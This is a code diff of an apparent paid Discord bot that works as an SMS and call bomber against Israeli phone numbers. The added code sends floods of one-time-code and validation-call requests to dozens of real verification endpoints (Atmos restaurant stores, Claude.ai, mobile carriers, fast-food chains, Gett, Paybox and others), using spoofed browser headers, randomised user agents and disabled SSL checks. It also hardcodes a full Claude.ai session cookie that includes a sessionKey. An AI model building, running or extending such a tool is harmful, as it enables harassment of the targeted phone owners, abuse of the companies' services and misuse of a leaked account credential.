@@ -26,15 +26,17 @@ ADMIN_ROLE_ID = 1480762750052601886
 STORE_URL = "https://discord.gg/3CxwPGuGyq"
 
 COOLDOWN_TIME = 20
+CREDITS_PER_CYCLE = 3
 MAX_CREDIT_SPEND = 100
 LAUNCH_DELAY = 3
 
-COLOR_PRIMARY = 0x2B2D31
-COLOR_ACCENT = 0x5865F2
-COLOR_SUCCESS = 0x23A55A
-COLOR_DANGER = 0xDA373C
+COLOR_MAIN = 0x5865F2
+COLOR_SUCCESS = 0x57F287
+COLOR_DANGER = 0xED4245
 COLOR_WARNING = 0xFEE75C
-COLOR_INFO = 0x1E1F22
+COLOR_INFO = 0x5865F2
+
+CLAUDE_SESSION = "activitySessionId=8e5e644c-d640-4b9f-be61-59b9a138a42b; anthropic-device-id=4ed16e2b-8252-4456-8e7a-e466ede65652; _fbp=fb.1.1773186995656.51415631283246056; app-shell-mode=gate-disabled; CH-prefers-color-scheme=light; __ssid=aac9d1c5-0950-4438-b7ea-a89a1639d015; cookie_seed_done=1; intercom-device-id-lupk8zyo=f68271ce-ab05-40b7-b143-901ad283a161; user-sidebar-visible-on-load=true; user-recents-collapsed=false; user-sidebar-pinned=true; g_state={\"i_l\":0,\"i_ll\":1773414635601,\"i_b\":\"y3RrxvHpC/63IgqxQoW+FkAztdzRlQfKqrSCo5paIW4\",\"i_e\":{\"enable_itp_optimization\":0},\"i_t\":1773501035602}; __cf_bm=3VjDxw6wkQm2wlbHFDvk8MaDT_DB6R36F4R.MVnz0p4-1773447632-1.0.1.1-6q05RiFdtxB27W.Dlk8sZzMKN2_GWuJqrNh03eIFieCaneWW7KiQJxVTVTNIxcxA4EeiLytjTSnQLzFe5XvedaBVzIzDp_EoeqS.drKNHic; _cfuvid=zbw_U3cChwMfKZyPfROexrLBbuzQTKW2FW6ko.UebTU-1773447632362-0.0.1.1-604800000; __stripe_mid=eabdbe50-cd60-4100-9f89-6403dde971eb6b036c; __stripe_sid=7b2497e5-5647-4528-aa38-9272e68de8c5289f41; sessionKey=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; lastActiveOrg=2b096853-0284-4d04-8bee-d3d6eb9ec7b1; cf_clearance=CM9MGR4oytc4fDuAdMWrgtGLrwjHrZfyGjDHQmELKWs-1773447692-1.2.1.1-8qu2TBglm35vOa3Y5dwU3Ue0D7gBkTfD20EtG9u.GXPEkWyTnnSOlsalbwktHG1lj9TvVOnuD19OeZaXbAIFnPMBAT3VnNkt2Rg5J8MQ9qAXN3Wf3DwDbPI.qiNUmVZwwvjmHdyRkI.fuz248__ESMWvCdMkeASIwHP7DT5e14INWZ3.iSxdKpFmZwoKzVGj1ge2Bba07dhQbqnbXVM1J7Ov4yMposOalAOKdx7hZN4; ajs_user_id=34d05785-fcf5-4298-8314-ac95766337ff; ajs_anonymous_id=64ed414c-6982-4d71-803f-2241e4e9546a; intercom-session-lupk8zyo=QTJuM3pjOVY3bWs1Njc4T0ZBQlZ1T2V6OUx0bjREempveE5JalZsR0FNMEpZYjdXZ3BYUE83WnhxYXV4S0tZSTdORlluTUc2OE14UnVCRHhBcjlzdE42SFo1ZW1NK1hWeEtZeTA0Y0hYYzlvcTN0RlBCa2YxV3JRbGJHM1B4WFltZVNNWk1QUXhWMzBEclNvUFphUTZNNTV0dk12T2s5QzhYSGN2U0pkeWNHM2NSOEZyMUU3amxwU2N5MGc4VkRpVEFZS0JrQzF3MFUyc2pzZlJyV0lTdXlDNncvYUYzcjQ1UkRkbzdmRTA1MnhiSHliZSt0akc2NjBzdjUyV2VwVkNQZ3ptd09xRzZZOTJMMXZEUzFVNmxxb3RTNG1ZYWs1K3Y5RFBTQXhiM1k9LS1YdEp3STBsUkF2S2FWSFptb29sYzFnPT0=--94e9f81d682285fead0655379f59452a0e43ab83; routingHint=sk-ant-rh-eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJFUzI1NiIsICJraWQiOiAiN0MxcWFPRnhqdWxaUjRFQnNuNk1UeUZGNWdDV2JHbFpNVDR2RklrRFFpbyJ9.eyJzdWIiOiAiMzRkMDU3ODUtZmNmNS00Mjk4LTgzMTQtYWM5NTc2NjMzN2ZmIiwgImlhdCI6IDE3NzM0NDc2OTYsICJpc3MiOiAiY2xhdWRlLWFpLXJvdXRpbmciLCAib25ib2FyZGluZ19jb21wbGV0ZSI6IHRydWUsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAiYWdlX3ZlcmlmaWVkIjogdHJ1ZSwgImxvY2FsZSI6ICJlbi1VUyJ9.yRj_WgY7-XZbfW8XvjAb8ybkDmv2wDhrNH2WqAywFX2DVfMGZayA92Tj5WJwB3-kcV2JC3Un2eERG-bLEPQlAw; _gcl_au=1.1.357471279.1773367551.67089487.1773447650.1773447710; _dd_s=aid=631a5dba-fcfc-4e29-854f-58b2ec36a49d&rum=0&expire=1773448656835"
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -81,7 +83,7 @@ async def has_unlimited(user_id: int) -> bool:
 
 async def format_balance(user_id: int) -> str:
     if await has_unlimited(user_id):
-        return "∞"
+        return "ללא הגבלה"
     return str(await fetch_balance(user_id))
 
 async def add_credits(user_id: int, amount: int):
@@ -167,8 +169,8 @@ async def send_request(session, url, form=None, json_data=None, headers_extra=No
     except:
         return False, tag
 
-async def atmos_request(session, store_id, phone, is_call=False):
-    tag = "atmos_call" if is_call else "atmos"
+async def atmos_request(session, store_id, phone, origin="https://order.atmos.rest", referer="https://order.atmos.rest/", is_call=False):
+    tag = f"atmos-{store_id}-call" if is_call else f"atmos-{store_id}"
     fd = aiohttp.FormData()
     fd.add_field("restaurant_id", store_id)
     fd.add_field("phone", phone)
@@ -177,26 +179,654 @@ async def atmos_request(session, store_id, phone, is_call=False):
         "User-Agent": random_agent(),
         "accept": "application/json, text/plain, */*",
         "accept-language": "he-IL,he;q=0.9",
-        "origin": "https://order.atmos.rest",
-        "referer": "https://order.atmos.rest/",
+        "accept-encoding": "gzip, deflate, br",
+        "origin": origin,
+        "referer": referer,
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "cross-site",
     }
     try:
-        timeout = aiohttp.ClientTimeout(total=5)
+        timeout = aiohttp.ClientTimeout(total=8)
         endpoint = "sendValidationCall" if is_call else "sendValidationCode"
         api_url = f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}"
         async with session.post(api_url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
             await resp.read()
-            return resp.status < 500, tag
-    except:
-        return False, tag
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
 
-async def run_single_batch(phone: str):
+async def process_atmos_batch(session, target, stores, is_call=False):
+    results = []
+    batch = 3
+    for i in range(0, len(stores), batch):
+        group = stores[i:i + batch]
+        tasks = [atmos_request(session, sid, target, is_call=is_call) for sid in group]
+        res = await asyncio.gather(*tasks, return_exceptions=True)
+        results.extend(res)
+        await asyncio.sleep(0.5)
+    return results
+
+async def claude_request(session, phone):
+    tag = "claude"
+    clean = phone.lstrip('0')
+    if not clean.startswith('+972'):
+        clean = f"+972{clean}"
+    url = "https://claude.ai/api/auth/send_phone_code"
+    h = {
+        "accept": "*/*",
+        "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
+        "content-type": "application/json",
+        "origin": "https://claude.ai",
+        "referer": "https://claude.ai/onboarding",
+        "user-agent": random_agent()
+    }
+    if CLAUDE_SESSION:
+        h["cookie"] = CLAUDE_SESSION
+    payload = {"phone_number": clean}
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def oshioshi_request(session, phone):
+    tag = "oshioshi"
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.get("https://delivery.oshioshi.co.il/he/login", timeout=timeout, ssl=False) as resp:
+            text = await resp.text()
+            match = re.search(r'name="_token"\s+value="([^"]+)"', text)
+            if not match:
+                return False, tag, "Missing Token"
+            token = match.group(1)
+        url = "https://delivery.oshioshi.co.il/he/auth/register-send-code"
+        form = f"phone={phone}&_token={token}"
+        h = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "origin": "https://delivery.oshioshi.co.il",
+            "referer": "https://delivery.oshioshi.co.il/he/",
+            "User-Agent": random_agent()
+        }
+        async with session.post(url, data=form, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def freetv_request(session, phone):
+    tag = "freetv"
+    formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
+    url = "https://middleware.freetv.tv/api/v1/send-verification-sms"
+    payload = {"msisdn": formatted}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "User-Agent": random_agent(),
+        "Origin": "https://freetv.tv",
+        "Referer": "https://freetv.tv/"
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def webcut_request(session, phone):
+    tag = "webcut"
+    url = "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp"
+    payload = {"type": "otp", "data": {"phone": phone}}
+    h = {
+        "Content-Type": "application/json",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def freeivr_request(session, phone):
+    tag = "freeivr"
+    formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
+    url = "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone"
+    payload = {"phone": formatted}
+    h = {
+        "Content-Type": "application/json",
+        "User-Agent": random_agent(),
+        "Origin": "https://freeivr.co.il",
+        "Referer": "https://freeivr.co.il/"
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def mitmachim_request(session, phone):
+    tag = "mitmachim"
+    url = "https://mitmachim.top/api/v3/plugins/MitMValidPhone"
+    payload = {"action": "Send", "phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://mitmachim.top",
+        "Referer": "https://mitmachim.top/register",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def pelephone_request(session, phone):
+    tag = "pelephone"
+    url = "https://www.pelephone.co.il/login/api/login/otpphone/"
+    payload = {"phone": phone, "terms": True, "appId": "DIGITALMy"}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.pelephone.co.il",
+        "Referer": "https://www.pelephone.co.il/login/?u=DIGITALMy",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def cellcom_request(session, phone):
+    tag = "cellcom"
+    url = "https://www.cellcom.co.il/api/auth/sms"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.cellcom.co.il",
+        "Referer": "https://www.cellcom.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def partner_request(session, phone):
+    tag = "partner"
+    url = "https://www.partner.co.il/api/register"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.partner.co.il",
+        "Referer": "https://www.partner.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def hot_request(session, phone):
+    tag = "hot"
+    url = "https://www.hotmobile.co.il/api/verify"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.hotmobile.co.il",
+        "Referer": "https://www.hotmobile.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def bezeq_request(session, phone):
+    tag = "bezeq"
+    url = "https://www.bezeq.co.il/api/auth"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.bezeq.co.il",
+        "Referer": "https://www.bezeq.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def gett_request(session, phone, email):
+    tag = "gett"
+    url = "https://www.gett.com/il/wp-admin/admin-ajax.php"
+    data = {
+        "action": "business_reg_action",
+        "phone": phone,
+        "first_name": "cyber",
+        "last_name": "il",
+        "work_email": email,
+        "privacy_policy": "true"
+    }
+    h = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://www.gett.com",
+        "Referer": "https://www.gett.com/il/start/?referrer=menu-button",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, data=data, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def shufersal_request(session, phone):
+    tag = "shufersal"
+    url = "https://www.shufersal.co.il/api/v1/auth/otp"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.shufersal.co.il",
+        "Referer": "https://www.shufersal.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def ramilevy_request(session, phone):
+    tag = "ramilevy"
+    url = "https://www.rami-levy.co.il/api/auth/sms"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.rami-levy.co.il",
+        "Referer": "https://www.rami-levy.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def victory_request(session, phone):
+    tag = "victory"
+    url = "https://www.victory.co.il/api/auth/sms"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.victory.co.il",
+        "Referer": "https://www.victory.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def tenbis_request(session, phone):
+    tag = "10bis"
+    url = "https://www.10bis.co.il/api/register"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.10bis.co.il",
+        "Referer": "https://www.10bis.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def mcdonalds_request(session, phone):
+    tag = "mcdonalds"
+    url = "https://www.mcdonalds.co.il/api/verify"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.mcdonalds.co.il",
+        "Referer": "https://www.mcdonalds.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def burgerking_request(session, phone):
+    tag = "burgerking"
+    url = "https://www.burgerking.co.il/api/auth"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.burgerking.co.il",
+        "Referer": "https://www.burgerking.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def kfc_request(session, phone):
+    tag = "kfc"
+    url = "https://www.kfc.co.il/api/sms"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.kfc.co.il",
+        "Referer": "https://www.kfc.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def pizzahut_request(session, phone):
+    tag = "pizzahut"
+    url = "https://www.pizza-hut.co.il/api/register"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.pizza-hut.co.il",
+        "Referer": "https://www.pizza-hut.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def dominos_request(session, phone):
+    tag = "dominos"
+    url = "https://www.dominos.co.il/api/auth/sms"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.dominos.co.il",
+        "Referer": "https://www.dominos.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def burgeranch_request(session, phone):
+    tag = "burgeranch"
+    url = "https://app.burgeranch.co.il/_a/aff_otp_auth"
+    form = f"phone={phone}"
+    h = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://app.burgeranch.co.il",
+        "Referer": "https://app.burgeranch.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, data=form, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def pango_request(session, phone):
+    tag = "pango"
+    url = "https://api.pango.co.il/auth/otp"
+    payload = {"phoneNumber": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://pango.co.il",
+        "Referer": "https://pango.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def hopon_request(session, phone):
+    tag = "hopon"
+    url = "https://api.hopon.co.il/v0.15/1/isr/users"
+    payload = {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": phone, "phoneCall": False}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://hopon.co.il",
+        "Referer": "https://hopon.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def yad2_request(session, phone):
+    tag = "yad2"
+    url = "https://www.yad2.co.il/api/auth/register"
+    payload = {"phone": phone, "action": "send_sms"}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.yad2.co.il",
+        "Referer": "https://www.yad2.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def paybox_request(session, phone):
+    tag = "paybox"
+    url = "https://payboxapp.com/api/auth/otp"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://payboxapp.com",
+        "Referer": "https://payboxapp.com/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def superpharm_request(session, phone):
+    tag = "superpharm"
+    url = "https://www.super-pharm.co.il/api/sms"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.super-pharm.co.il",
+        "Referer": "https://www.super-pharm.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def zap_request(session, phone):
+    tag = "zap"
+    url = "https://www.zap.co.il/api/auth/sms"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.zap.co.il",
+        "Referer": "https://www.zap.co.il/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def wolt_request(session, phone):
+    tag = "wolt"
+    url = "https://www.wolt.com/api/v1/verify"
+    payload = {"phone": phone}
+    h = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Origin": "https://www.wolt.com",
+        "Referer": "https://www.wolt.com/",
+        "User-Agent": random_agent()
+    }
+    try:
+        timeout = aiohttp.ClientTimeout(total=8)
+        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
+            await resp.read()
+            ok = 200 <= resp.status < 300
+            return ok, tag, "OK" if ok else f"HTTP {resp.status}"
+    except Exception as e:
+        return False, tag, str(type(e).__name__)
+
+async def run_all(phone: str):
     raw = phone
-    phone_raw = phone
-    phone_intl = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
+    formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
     sid = str(uuid.uuid4())
     random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
-    
+    FORM_TYPE = "application/x-www-form-urlencoded; charset=UTF-8"
+    BROWSER_ID = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'
+
+    def form_headers(origin, referer, extra=None):
+        h = {"Content-Type": FORM_TYPE, "x-requested-with": "XMLHttpRequest",
+             "origin": origin, "referer": referer,
+             "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
+             "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin"}
+        if extra:
+            h.update(extra)
+        return h
+
+    def json_headers(origin, referer, extra=None):
+        h = {"Content-Type": "application/json",
+             "origin": origin, "referer": referer,
+             "sec-ch-ua": BROWSER_ID, "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
+             "sec-fetch-dest": "empty", "sec-fetch-mode": "cors"}
+        if extra:
+            h.update(extra)
+        return h
+
     connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as s:
         atmos_stores = [
@@ -206,201 +836,406 @@ async def run_single_batch(phone: str):
             "2063","2070","2073","2076","2078","2087","2088","2091",
         ]
         
-        tasks = []
-        for store in atmos_stores:
-            tasks.append(atmos_request(s, store, raw, False))
-            tasks.append(atmos_request(s, store, raw, True))
+        atmos_sms = await process_atmos_batch(s, raw, atmos_stores, is_call=False)
+        atmos_call = await process_atmos_batch(s, raw, atmos_stores, is_call=True)
         
-        tasks.append(atmos_request(s, "23", raw, False))
-        tasks.append(atmos_request(s, "59", raw, False))
-        
+        atmos_club = [
+            atmos_request(s, "23", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False),
+            atmos_request(s, "59", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False),
+        ]
+
         geteat_fd = aiohttp.FormData()
         geteat_fd.add_field("restaurant_id", "9")
         geteat_fd.add_field("phone", raw)
         geteat_fd.add_field("testing", "false")
         
-        all_tasks = [
+        tasks = [
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
-                json_data={"agreeTou": True, "phone": phone_intl}, tag="netfree"),
-            send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/",
-                json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone"),
-            send_request(s, "https://www.cellcom.co.il/api/auth/sms",
-                json_data={"phone": raw}, tag="cellcom"),
-            send_request(s, "https://www.partner.co.il/api/register",
-                json_data={"phone": raw}, tag="partner"),
-            send_request(s, "https://www.hotmobile.co.il/api/verify",
-                json_data={"phone": raw}, tag="hot"),
-            send_request(s, "https://www.bezeq.co.il/api/auth",
-                json_data={"phone": raw}, tag="bezeq"),
-            send_request(s, "https://www.gett.com/il/wp-admin/admin-ajax.php",
